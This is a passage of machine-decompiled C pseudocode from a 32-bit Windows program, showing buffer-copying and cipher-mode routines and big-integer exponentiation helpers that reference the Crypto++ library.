      v15 = &v18[3 * v9];
      v11 = (*(int (__thiscall **)(_DWORD *))(*this + 8))(this);
      v12 = (*(unsigned __int8 (__thiscall **)(_DWORD *, _QWORD *, int))(v10 + 4))(this, v15, v11) == 0;
      v7 = v15;
    }
    while ( v12 );
  }
  v13 = sub_43DBB0(this + 3, &v18[3 * v5]);
  v21 = -1;
  `eh vector destructor iterator'(v18, 0x18u, 3u, (void (__thiscall *)(void *))sub_4066A0);
  return v13;
}
// 46C502: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *));
// 46C8AE: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 43B280: using guessed type _DWORD var_40[6];
// 43B280: using guessed type char var_28[24];

//----- (0043B3C0) --------------------------------------------------------
unsigned int __thiscall sub_43B3C0(_DWORD *this, unsigned int a2, size_t Size)
{
  size_t v3; // ebx
  unsigned int v5; // edi
  size_t v6; // ecx
  size_t v7; // esi
  unsigned int result; // eax
  int v9; // esi
  int v10; // esi
  int v11; // esi
  void *v12; // edi
  unsigned int v13; // edi
  int v14; // [esp+10h] [ebp-8h]
  void *v15; // [esp+14h] [ebp-4h]

  v3 = Size;
  v5 = a2;
  v6 = this[5];
  if ( !v6 )
  {
    v15 = (void *)a2;
LABEL_7:
    v9 = (*(int (__thiscall **)(_DWORD *))(*(this - 12) + 76))(this - 12);
    v14 = v9;
    result = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 8))(v9);
    a2 = result;
    if ( v3 >= result )
    {
      v10 = v3 / result;
      result = (*(int (__thiscall **)(int, unsigned int, size_t))(*(_DWORD *)v14 + 20))(v14, v5, v3 / result);
      v11 = a2 * v10;
      v3 -= v11;
      v12 = (void *)(v11 + v5);
      v9 = v14;
      Size = v3;
      v15 = v12;
    }
    if ( v3 )
    {
      v13 = sub_4397E0(&Size, &a2);
      (*(void (__fastcall **)(int, unsigned int, unsigned int, unsigned int))(*(_DWORD *)v9 + 20))(
        v14,
        v13 % a2,
        this[4] + this[3] - v13,
        v13 / a2);
      result = (unsigned int)memmove(v15, (const void *)(this[4] + this[3] - v13), v3);
      this[5] = v13 - v3;
    }
    return result;
  }
  v7 = v6;
  if ( Size < v6 )
    v7 = Size;
  result = (unsigned int)memmove((void *)a2, (const void *)(this[3] + this[4] - v6), v7);
  this[5] -= v7;
  v3 -= v7;
  v5 += v7;
  Size = v3;
  v15 = (void *)v5;
  if ( v3 )
    goto LABEL_7;
  return result;
}

//----- (0043B4B0) --------------------------------------------------------
int __thiscall sub_43B4B0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
  return *(_DWORD *)(*(_DWORD *)(v1 + 4) + 4) + v1 + 4;
}

//----- (0043B4D0) --------------------------------------------------------
__m128i *__thiscall sub_43B4D0(__int128 **this, unsigned int *a2)
{
  return sub_45F090(this[48], a2);
}

//----- (0043B500) --------------------------------------------------------
int __thiscall sub_43B500(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 56))(this[1]);
}

//----- (0043B510) --------------------------------------------------------
_OWORD *__thiscall sub_43B510(_OWORD **this)
{
  return sub_45C2B0(this[48]);
}

//----- (0043B520) --------------------------------------------------------
int __thiscall sub_43B520(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 64))(this[1]);
}

//----- (0043B530) --------------------------------------------------------
char __stdcall sub_43B530(int a1)
{
  _DWORD *v1; // eax
  char v2; // bl
  unsigned int v3; // edx
  void *v4; // esi
  int v6; // [esp+10h] [ebp-24h] BYREF
  unsigned int v7; // [esp+18h] [ebp-1Ch]
  unsigned int v8; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v10; // [esp+30h] [ebp-4h]

  v1 = sub_441D00(&v6, a1);
  v10 = 0;
  v2 = sub_443170(v1);
  v3 = v8;
  v4 = Block;
  if ( v7 < v8 )
    v3 = v7;
  v10 = 1;
  memset(Block, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
  return v2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043B5D0) --------------------------------------------------------
int __stdcall sub_43B5D0(int a1, int a2, int a3)
{
  return 0;
}

//----- (0043B5E0) --------------------------------------------------------
int __thiscall sub_43B5E0(void *this, int a2)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
}

//----- (0043B5F0) --------------------------------------------------------
_DWORD *__thiscall sub_43B5F0(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';
  return sub_43D420((_DWORD *)(a2 + 16), (_DWORD *)(this + 16));
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BACD4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable';

//----- (0043B6A0) --------------------------------------------------------
_DWORD *__thiscall sub_43B6A0(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // ebx
  unsigned int v4; // edx
  void *v5; // esi
  unsigned int v6; // edx
  void *v7; // esi
  char v9[8]; // [esp+10h] [ebp-3Ch] BYREF
  unsigned int v10; // [esp+18h] [ebp-34h]
  unsigned int v11; // [esp+1Ch] [ebp-30h]
  void *v12; // [esp+20h] [ebp-2Ch]
  _DWORD v13[2]; // [esp+28h] [ebp-24h] BYREF
  unsigned int v14; // [esp+30h] [ebp-1Ch]
  unsigned int v15; // [esp+34h] [ebp-18h]
  void *Block; // [esp+38h] [ebp-14h]
  int v17; // [esp+48h] [ebp-4h]

  v2 = (_DWORD *)sub_4443D0((int)v9, 32 * this[6]);
  v17 = 0;
  sub_4432F0(v2, v13, this + 3);
  LOBYTE(v17) = 1;
  v3 = sub_43DBB0(this + 15, v13);
  v4 = v15;
  v5 = Block;
  if ( v14 < v15 )
    v4 = v14;
  LOBYTE(v17) = 2;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v6 = v11;
  v7 = v12;
  if ( v10 < v11 )
    v6 = v10;
  v17 = 3;
  memset(v12, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  return v3;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 43B6A0: using guessed type char var_3C[8];
// 43B6A0: using guessed type _DWORD var_24[2];

//----- (0043B780) --------------------------------------------------------
_DWORD *__thiscall sub_43B780(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  int v8; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  v3 = sub_442A60(a2, &v8, this + 3);
  v12 = 0;
  v4 = sub_43DBB0(this + 15, v3);
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v12 = 1;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043B820) --------------------------------------------------------
_DWORD *__thiscall sub_43B820(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  unsigned int v7; // edx
  void *v8; // esi
  _DWORD v10[2]; // [esp+10h] [ebp-3Ch] BYREF
  unsigned int v11; // [esp+18h] [ebp-34h]
  unsigned int v12; // [esp+1Ch] [ebp-30h]
  void *v13; // [esp+20h] [ebp-2Ch]
  _DWORD v14[2]; // [esp+28h] [ebp-24h] BYREF
  unsigned int v15; // [esp+30h] [ebp-1Ch]
  unsigned int v16; // [esp+34h] [ebp-18h]
  void *Block; // [esp+38h] [ebp-14h]
  int v18; // [esp+48h] [ebp-4h]

  sub_44E440(a2, v10, a3);
  v18 = 0;
  sub_4432F0(v10, v14, this + 3);
  LOBYTE(v18) = 1;
  v4 = sub_43DBB0(this + 15, v14);
  v5 = v16;
  v6 = Block;
  if ( v15 < v16 )
    v5 = v15;
  LOBYTE(v18) = 2;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  v7 = v12;
  v8 = v13;
  if ( v11 < v12 )
    v7 = v11;
  v18 = 3;
  memset(v13, 0, 4 * v7);
  if ( v7 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 43B820: using guessed type _DWORD var_3C[2];
// 43B820: using guessed type _DWORD var_24[2];

//----- (0043B900) --------------------------------------------------------
void __thiscall sub_43B900(_DWORD *this, int a2)
{
  unsigned int v3; // ebp
  void *v4; // edx

  v3 = this[2];
  v4 = (void *)this[3];
  if ( v3 != a2 )
  {
    memset(v4, 0, v3);
    if ( v3 )
      j_j_unknown_libname_61(v4);
    else
      j_j___free_base(v4);
    if ( !a2 )
    {
      this[2] = 0;
      this[3] = 0;
      this[1] = -1;
      return;
    }
    v4 = (void *)sub_45AC10(a2);
  }
  this[2] = a2;
  this[3] = v4;
  this[1] = -1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043B970) --------------------------------------------------------
char __thiscall sub_43B970(_DWORD *this, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // edx
  unsigned int v5; // ebx
  unsigned int v6; // ebp
  unsigned int v7; // edi
  unsigned int v8; // esi
  int v9; // esi
  int v10; // eax
  int v11; // edx
  unsigned int v12; // eax
  int v13; // edx
  BOOL v15; // ecx
  _DWORD *v16; // ecx
  unsigned int v17; // esi
  int v18; // eax
  unsigned int v19; // edi
  _DWORD *v21; // [esp+20h] [ebp-Ch]
  int v22; // [esp+24h] [ebp-8h]
  int v23; // [esp+28h] [ebp-4h]
  unsigned int v24; // [esp+30h] [ebp+4h]
  int v25; // [esp+30h] [ebp+4h]

  v4 = this[16];
  v21 = this;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  if ( v4 )
  {
    v8 = this[16];
    if ( a4 < v4 )
      v8 = a4;
    sub_45B110(a2, a3, this[14] + this[15] - v4, v8);
    this = v21;
    v5 -= v8;
    a4 = v5;
    v6 += v8;
    v21[16] -= v8;
    v7 = v8 + a2;
  }
  v24 = v7;
  v9 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 76))(this - 1);
  v22 = v9;
  v10 = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 8))(v9);
  v11 = *(_DWORD *)v9;
  a3 = v10;
  if ( (*(unsigned __int8 (__thiscall **)(int))(v11 + 24))(v9) && v5 >= a3 )
  {
    v25 = v5 / a3;
    v12 = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 4))(v9);
    if ( v12 == 1
      || (!v12 || ((v12 - 1) & v12) != 0 ? (v13 = v6 % v12) : (v13 = v6 & (v12 > 1 ? v12 - 1 : 0)), a4 = 0, !v13) )
    {
      a4 = 2;
    }
    v15 = 1;
    if ( v12 != 1 )
    {
      if ( ((v12 - 1) & v12) != 0 ? v7 % v12 : v7 & (v12 > 1 ? v12 - 1 : 0) )
        v15 = 0;
    }
    (*(void (__thiscall **)(int, unsigned int, unsigned int, unsigned int, int))(*(_DWORD *)v9 + 28))(
      v9,
      a4 | v15,
      v7,
      v6,
      v25);
    v7 += a3 * v25;
    v6 += a3 * v25;
    v5 -= a3 * v25;
    v24 = v7;
    a4 = v5;
  }
  v16 = v21;
  v17 = v21[14];
  v18 = v17 / a3;
  v23 = v17 / a3;
  if ( v5 >= v17 )
  {
    while ( 1 )
    {
      (*(void (__thiscall **)(int, _DWORD, int))(*(_DWORD *)v22 + 20))(v22, v16[15], v23);
      LOBYTE(v18) = sub_45B110(v7, v6, v21[15], v17);
      v5 -= v17;
      v6 += v17;
      v7 += v17;
      if ( v5 < v17 )
        break;
      v16 = v21;
    }
    a4 = v5;
    v24 = v7;
  }
  if ( v5 )
  {
    v19 = sub_4397E0(&a4, &a3);
    (*(void (__fastcall **)(int, unsigned int, unsigned int, unsigned int))(*(_DWORD *)v22 + 20))(
      v22,
      v19 % a3,
      v21[15] + v21[14] - v19,
      v19 / a3);
    LOBYTE(v18) = sub_45B110(v24, v6, v21[15] + v21[14] - v19, v5);
    v21[16] = v19 - v5;
  }
  return v18;
}
// 43BA4B: conditional instruction was optimized away because eax.4>=2u

//----- (0043BB60) --------------------------------------------------------
int __thiscall sub_43BB60(void *this, int a2, int a3, int a4, int a5, int a6, int a7)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 12))(this);
}

//----- (0043BB70) --------------------------------------------------------
_DWORD *__thiscall sub_43BB70(_DWORD **this, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, _DWORD *, int))(*this[1] + 72))(this[1], a2, a3);
  return sub_43DBB0(a2, v3);
}

//----- (0043BB90) --------------------------------------------------------
int __thiscall sub_43BB90(void *this)
{
  return (*(int (__thiscall **)(void *, _DWORD, _DWORD))(*(_DWORD *)this + 60))(this, 0, 0);
}

//----- (0043BBA0) --------------------------------------------------------
int __thiscall sub_43BBA0(int *this, int a2, unsigned int a3)
{
  int v4; // ebp
  int v5; // esi
  int v6; // eax
  int v7; // esi
  int v8; // edi
  int v9; // eax

  v4 = (*(int (__thiscall **)(int *))(*this + 76))(this);
  this[17] = 0;
  v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 16))(v4);
  v6 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 8))(v4);
  sub_43B900(this + 13, v6 * v5);
  v7 = this[16];
  v8 = *(_DWORD *)v4;
  v9 = sub_4386B0(this, a3);
  return (*(int (__thiscall **)(int, int, int, int))(v8 + 36))(v4, v7, a2, v9);
}

//----- (0043BC00) --------------------------------------------------------
_DWORD *__thiscall sub_43BC00(void *this, _DWORD *a2, int a3, int a4)
{
  sub_43D6C0(a2);
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 48))(this, a2, a3, a4, 1);
  return a2;
}

//----- (0043BC80) --------------------------------------------------------
int __thiscall sub_43BC80(_DWORD **this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(_DWORD *, int, int, int))(*this[1] + 76))(this[1], a2, a3, a4);
  return a2;
}

//----- (0043BCA0) --------------------------------------------------------
int __thiscall sub_43BCA0(_DWORD *this, unsigned __int64 a2)
{
  int v3; // ebp
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rcx
  int result; // eax
  int v7; // [esp+10h] [ebp-4h]
  unsigned int v8; // [esp+18h] [ebp+4h]

  v7 = (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 76))(this - 1);
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
  v5 = a2 % (unsigned int)v3;
  v4 = a2 / (unsigned int)v3;
  v8 = v5;
  result = (*(int (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)v7 + 44))(v7, v4, HIDWORD(v4));
  if ( __PAIR64__(HIDWORD(v5), v8) )
  {
    result = (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v7 + 20))(v7, this[14] + this[15] - v3, 1);
    this[16] = v3 - v8;
  }
  else
  {
    this[16] = 0;
  }
  return result;
}

//----- (0043BD20) --------------------------------------------------------
void __thiscall sub_43BD20(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5)
{
  void *v5; // eax

  v5 = (void *)(*(int (__thiscall **)(void *))(*(_DWORD *)this + 88))(this);
  sub_43BD40(v5, a2, a3, a4, a5);
}

//----- (0043BD40) --------------------------------------------------------
void __thiscall sub_43BD40(void *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5)
{
  int v5; // ebx
  unsigned int v6; // edi
  _DWORD *v7; // esi
  size_t v8; // edi
  size_t v9; // eax
  void *v10; // eax
  int v11; // eax
  unsigned int v12; // ecx
  _DWORD *v13; // eax
  char v14; // bl
  int *v15; // eax
  unsigned int v16; // eax
  unsigned int v17; // eax
  _DWORD *v18; // esi
  unsigned int v19; // edx
  void *v20; // esi
  unsigned int v21; // edx
  void *v22; // esi
  int v23; // esi
  unsigned int v24; // ebx
  unsigned int v25; // edi
  int v26; // ecx
  int v27; // eax
  bool v28; // zf
  int v29; // esi
  _DWORD *v30; // eax
  int v31; // ecx
  unsigned int v32; // edi
  _DWORD *v33; // esi
  int v34; // ecx
  _DWORD *i; // edi
  _DWORD *v36; // eax
  unsigned int v37; // edi
  _DWORD *v38; // ebx
  _DWORD *v39; // esi
  int v40; // edi
  _DWORD *v41; // ecx
  int v42; // edx
  int v43; // eax
  int v44; // esi
  int v45; // eax
  int v46; // esi
  int v47; // eax
  unsigned int v48; // edi
  int v49; // ecx
  int v50; // eax
  bool v51; // al
  _DWORD *v52; // eax
  _DWORD *v53; // eax
  int v54; // esi
  int v55; // edi
  int v56; // esi
  int v57; // esi
  int v58; // eax
  _DWORD *v59; // eax
  unsigned int v60; // edx
  void *v61; // esi
  int v62; // [esp-4h] [ebp-84h]
  _DWORD v63[2]; // [esp+10h] [ebp-70h] BYREF
  unsigned int v64; // [esp+18h] [ebp-68h]
  unsigned int v65; // [esp+1Ch] [ebp-64h]
  void *v66; // [esp+20h] [ebp-60h]
  _DWORD *v67; // [esp+28h] [ebp-58h]
  _DWORD *v68; // [esp+2Ch] [ebp-54h]
  _DWORD *v69; // [esp+30h] [ebp-50h]
  _DWORD v70[2]; // [esp+34h] [ebp-4Ch] BYREF
  unsigned int v71; // [esp+3Ch] [ebp-44h]
  unsigned int v72; // [esp+40h] [ebp-40h]
  void *v73; // [esp+44h] [ebp-3Ch]
  _DWORD v74[2]; // [esp+4Ch] [ebp-34h] BYREF
  unsigned int v75; // [esp+54h] [ebp-2Ch]
  unsigned int v76; // [esp+58h] [ebp-28h]
  void *Block; // [esp+5Ch] [ebp-24h]
  unsigned int v78; // [esp+64h] [ebp-1Ch]
  int v79; // [esp+68h] [ebp-18h]
  int v80; // [esp+6Ch] [ebp-14h]
  char v81; // [esp+70h] [ebp-10h]
  __int16 v82; // [esp+71h] [ebp-Fh]
  char v83; // [esp+73h] [ebp-Dh]
  int v84; // [esp+7Ch] [ebp-4h]
  _DWORD *v85; // [esp+80h] [ebp+0h] BYREF
  _DWORD *v86; // [esp+84h] [ebp+4h]
  int v87; // [esp+88h] [ebp+8h]
  unsigned int v88; // [esp+8Ch] [ebp+Ch]
  void *v89; // [esp+90h] [ebp+10h]
  int v90; // [esp+94h] [ebp+14h] BYREF
  _DWORD *v91; // [esp+98h] [ebp+18h]
  _DWORD *v92; // [esp+9Ch] [ebp+1Ch]
  unsigned int v93; // [esp+A0h] [ebp+20h]
  _DWORD *v94; // [esp+A4h] [ebp+24h]
  _DWORD *v95; // [esp+A8h] [ebp+28h]
  int v96; // [esp+ACh] [ebp+2Ch]
  _DWORD *v97; // [esp+B0h] [ebp+30h]
  _DWORD *v98; // [esp+B4h] [ebp+34h]
  _DWORD *v99; // [esp+C4h] [ebp+44h]
  _DWORD *v100; // [esp+C8h] [ebp+48h]
  bool v101; // [esp+CBh] [ebp+4Bh]

  v5 = (int)this;
  v89 = this;
  v6 = a5;
  v7 = 0;
  v97 = 0;
  v85 = 0;
  v86 = 0;
  v87 = 0;
  if ( a5 )
  {
    if ( a5 > 0x15555555 )
      sub_420130();
    v8 = 12 * a5;
    if ( 12 * a5 < 0x1000 )
    {
      if ( v8 )
        v7 = operator new(v8);
      else
        v7 = 0;
    }
    else
    {
      v9 = v8 + 35;
      if ( v8 + 35 <= v8 )
        v9 = -1;
      v10 = operator new(v9);
      if ( !v10 )
        _invalid_parameter_noinfo_noreturn();
      v7 = (_DWORD *)(((unsigned int)v10 + 35) & 0xFFFFFFE0);
      *(v7 - 1) = v10;
    }
    v11 = (int)&v7[v8 / 4];
    v97 = v7;
    v6 = a5;
    v12 = a5;
    v87 = v11;
    v13 = v7;
    v85 = v7;
    do
    {
      *v13 = 0;
      v13[1] = 0;
      v13[2] = 0;
      v13 += 3;
      --v12;
    }
    while ( v12 );
    v86 = v13;
  }
  v84 = 1;
  v90 = 0;
  v91 = 0;
  v92 = 0;
  if ( v6 )
  {
    if ( v6 > 0x3FFFFFF )
      sub_420130();
    sub_43C830(&v90, v6);
    v98 = v7;
    v96 = 0;
    v88 = v6;
    do
    {
      v14 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 20))(v5);
      sub_43D420(v70, a4);
      LOBYTE(v84) = 2;
      v15 = sub_443600();
      sub_43D420(v74, v15);
      LOBYTE(v84) = 3;
      v78 = 0;
      v79 = 0;
      v80 = 0;
      v81 = v14;
      v82 = 256;
      v83 = 0;
      v16 = sub_440BD0(v70);
      if ( v16 > 0x11 )
      {
        if ( v16 > 0x18 )
        {
          if ( v16 > 0x46 )
          {
            if ( v16 > 0xC5 )
            {
              if ( v16 > 0x21B )
                v17 = (v16 > 0x59A) + 6;
              else
                v17 = 5;
            }
            else
            {
              v17 = 4;
            }
          }
          else
          {
            v17 = 3;
          }
        }
        else
        {
          v17 = 2;
        }
      }
      else
      {
        v17 = 1;
      }
      v78 = v17;
      sub_43E590((int)v74, v17);
      v18 = v91;
      LOBYTE(v84) = 4;
      if ( v92 == v91 )
      {
        sub_439890(&v90, v91, (int)v70);
      }
      else
      {
        sub_43D420(v91, v70);
        LOBYTE(v84) = 5;
        sub_43D420(v18 + 6, v74);
        v18[12] = v78;
        v18[13] = v79;
        v18[14] = v80;
        *((_BYTE *)v18 + 60) = v81;
        *(_WORD *)((char *)v18 + 61) = v82;
        *((_BYTE *)v18 + 63) = v83;
        v91 += 16;
      }
      a4 += 6;
      v19 = v76;
      v20 = Block;
      if ( v75 < v76 )
        v19 = v75;
      LOBYTE(v84) = 6;
      memset(Block, 0, 4 * v19);
      if ( v19 )
        j_j_unknown_libname_61(v20);
      else
        j_j___free_base(v20);
      v21 = v72;
      v22 = v73;
      if ( v71 < v72 )
        v21 = v71;
      LOBYTE(v84) = 7;
      memset(v73, 0, 4 * v21);
      if ( v21 )
        j_j_unknown_libname_61(v22);
      else
        j_j___free_base(v22);
      v23 = v96 + v90;
      LOBYTE(v84) = 1;
      v24 = 32 * sub_44E560((_DWORD *)(v96 + v90));
      if ( *(_BYTE *)(v23 + 62) )
        v25 = 0;
      else
        v25 = *(_DWORD *)(v23 + 48);
      *(_BYTE *)(v23 + 62) = 0;
      if ( sub_4428B0((_DWORD *)v23, v25) )
      {
LABEL_47:
        sub_43E500((_DWORD *)v23, v25);
        v26 = *(_DWORD *)(v23 + 48);
        *(_DWORD *)(v23 + 52) += v25;
        v27 = sub_4433F0((_DWORD *)v23, 1 << v26);
        v28 = *(_BYTE *)(v23 + 60) == 0;
        *(_DWORD *)(v23 + 56) = v27;
        if ( v28 || !sub_4428B0((_DWORD *)v23, *(_DWORD *)(v23 + 48)) )
        {
          *(_BYTE *)(v23 + 61) = 0;
        }
        else
        {
          *(_DWORD *)(v23 + 56) = (1 << *(_DWORD *)(v23 + 48)) - *(_DWORD *)(v23 + 56);
          *(_BYTE *)(v23 + 61) = 1;
          sub_43E3C0(v23, v23 + 24);
        }
      }
      else
      {
        while ( v25 < v24 )
        {
          if ( sub_4428B0((_DWORD *)v23, ++v25) )
            goto LABEL_47;
        }
        *(_BYTE *)(v23 + 63) = 1;
      }
      v5 = (int)v89;
      v29 = v96 + v90;
      v30 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v89 + 8))(v89);
      v31 = *(_DWORD *)(v29 + 48);
      v95 = v30;
      v32 = 1 << (v31 - 1);
      v33 = (_DWORD *)v98[1];
      v34 = (int)v33 - *v98;
      v94 = (_DWORD *)*v98;
      v93 = v34 / 24;
      if ( v32 >= v34 / 24 )
      {
        v36 = v98;
        if ( v32 > v34 / 24 )
        {
          if ( v32 <= (v98[2] - *v98) / 24 )
          {
            v36 = v98;
            v37 = v32 - v93;
            v67 = v33;
            v68 = v33;
            v69 = v98;
            LOBYTE(v84) = 8;
            if ( v37 )
            {
              v38 = v95;
              do
              {
                sub_43D420(v33, v38);
                v33 += 6;
                v68 = v33;
                --v37;
              }
              while ( v37 );
              v5 = (int)v89;
              v36 = v98;
            }
            v67 = v33;
            LOBYTE(v84) = 1;
            v36[1] = v33;
          }
          else
          {
            sub_4399D0((int)v98, v32, v95);
            v36 = v98;
          }
        }
      }
      else
      {
        v94 += 6 * v32;
        for ( i = v94; i != v33; i += 6 )
          (*(void (__thiscall **)(_DWORD *, _DWORD))*i)(i, 0);
        v36 = v98;
        v98[1] = v94;
      }
      v96 += 64;
      v28 = v88-- == 1;
      v98 = v36 + 3;
    }
    while ( !v28 );
    v6 = a5;
  }
  v95 = 0;
  sub_43D420(v63, a3);
  LOBYTE(v84) = 9;
  while ( 1 )
  {
    v101 = 0;
    if ( !v6 )
      break;
    v39 = v97;
    v40 = 0;
    v41 = (_DWORD *)a5;
    v96 = 0;
    v99 = v97;
    v98 = (_DWORD *)a5;
    do
    {
      v42 = v40 + v90;
      if ( !*(_BYTE *)(v40 + v90 + 63) && v95 == *(_DWORD **)(v42 + 52) )
      {
        v28 = *(_BYTE *)(v42 + 61) == 0;
        v43 = *v39;
        v44 = *(_DWORD *)v5;
        v45 = v43 + 24 * (*(_DWORD *)(v42 + 56) >> 1);
        v94 = (_DWORD *)v45;
        if ( v28 )
        {
          (*(void (__thiscall **)(int, int, _DWORD *))(v44 + 32))(v5, v45, v63);
        }
        else
        {
          v62 = (*(int (__thiscall **)(int, _DWORD *))(v44 + 16))(v5, v63);
          (*(void (__thiscall **)(int, _DWORD *, int))(v44 + 32))(v5, v94, v62);
        }
        v46 = v40 + v90;
        v47 = sub_44E560((_DWORD *)(v40 + v90));
        v28 = *(_BYTE *)(v46 + 62) == 0;
        v93 = 32 * v47;
        if ( v28 )
          v48 = *(_DWORD *)(v46 + 48);
        else
          v48 = 0;
        *(_BYTE *)(v46 + 62) = 0;
        if ( sub_4428B0((_DWORD *)v46, v48) )
        {
LABEL_80:
          sub_43E500((_DWORD *)v46, v48);
          v49 = *(_DWORD *)(v46 + 48);
          *(_DWORD *)(v46 + 52) += v48;
          v50 = sub_4433F0((_DWORD *)v46, 1 << v49);
          v28 = *(_BYTE *)(v46 + 60) == 0;
          *(_DWORD *)(v46 + 56) = v50;
          if ( v28 || !sub_4428B0((_DWORD *)v46, *(_DWORD *)(v46 + 48)) )
          {
            *(_BYTE *)(v46 + 61) = 0;
          }
          else
          {
            *(_DWORD *)(v46 + 56) = (1 << *(_DWORD *)(v46 + 48)) - *(_DWORD *)(v46 + 56);
            *(_BYTE *)(v46 + 61) = 1;
            sub_43E3C0(v46, v46 + 24);
          }
        }
        else
        {
          while ( v48 < v93 )
          {
            if ( sub_4428B0((_DWORD *)v46, ++v48) )
              goto LABEL_80;
          }
          *(_BYTE *)(v46 + 63) = 1;
        }
        v40 = v96;
        v39 = v99;
        v41 = v98;
      }
      v51 = v101 || !*(_BYTE *)(v90 + v40 + 63);
      v39 += 3;
      v101 = v51;
      v40 += 64;
      v99 = v39;
      v41 = (_DWORD *)((char *)v41 - 1);
      v96 = v40;
      v98 = v41;
    }
    while ( v41 );
    if ( !v51 )
    {
      v53 = v97;
      do
      {
        v100 = a2;
        a2 += 6;
        sub_43DBB0(v100, (_DWORD *)(*v53 + 8 * (3 * ((v53[1] - *v53) / 24) - 3)));
        v54 = *v97;
        if ( (unsigned int)((v97[1] - *v97) / 24) > 1 )
        {
          v55 = (v97[1] - *v97) / 24 - 2;
          if ( v55 >= 1 )
          {
            v56 = 24 * v55;
            do
            {
              (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 32))(v5, v56 + *v97, v56 + *v97 + 24);
              (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v5 + 32))(v5, v100, v56 + *v97);
              v56 -= 24;
              --v55;
            }
            while ( v55 );
            v54 = *v97;
          }
          (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v5 + 32))(v5, v54, v54 + 24);
          v57 = *(_DWORD *)v5;
          v58 = (*(int (__thiscall **)(int, _DWORD *, _DWORD))(*(_DWORD *)v5 + 24))(v5, v100, *v97);
          v59 = (_DWORD *)(*(int (__thiscall **)(int, int))(v57 + 12))(v5, v58);
          sub_43DBB0(v100, v59);
        }
        v53 = v97 + 3;
        v28 = a5-- == 1;
        v97 += 3;
      }
      while ( !v28 );
      break;
    }
